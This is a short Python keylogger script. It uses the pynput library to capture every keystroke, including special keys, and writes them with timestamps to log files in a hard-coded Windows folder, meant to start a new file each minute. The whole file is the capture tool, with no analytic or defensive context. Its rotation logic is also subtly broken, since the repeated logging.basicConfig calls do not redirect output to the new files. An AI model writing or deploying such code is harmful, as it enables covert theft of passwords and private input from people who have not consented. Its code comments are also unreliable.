import os
import logging
import time
from pynput.keyboard import Key, Listener


# Define the log directory
log_dir = r"C:\Users\mohan\Downloads\python\keylogger\k3"  # Change this to your desired path


# Ensure the directory exists
if not os.path.exists(log_dir):
    os.makedirs(log_dir)


# Function to create a new log file
def create_new_log_file():
    timestamp = time.strftime("%Y%m%d_%H%M")  # Format the current time for the filename
    log_file = os.path.join(log_dir, f"keyLog_{timestamp}.txt")
    logging.basicConfig(
        filename=log_file,
        level=logging.DEBUG,
        format='%(asctime)s: %(message)s'
    )
    return log_file


# Start logging with the first log file
current_log_file = create_new_log_file()
start_time = time.time()


# Time interval in seconds (60 seconds for 1 minute)
time_interval = 60


def on_press(key):
    global current_log_file, start_time


    # Log the key pressed
    try:
        logging.info(f'Key {key.char} pressed.')
    except AttributeError:
        logging.info(f'Special key {key} pressed.')


    # Check if the time interval has passed
    if time.time() - start_time >= time_interval:  # Check if 60 seconds have passed
        current_log_file = create_new_log_file()  # Create a new log file
        start_time = time.time()  # Reset the timer


# Start the listener
with Listener(on_press=on_press) as listener:
    listener.join()
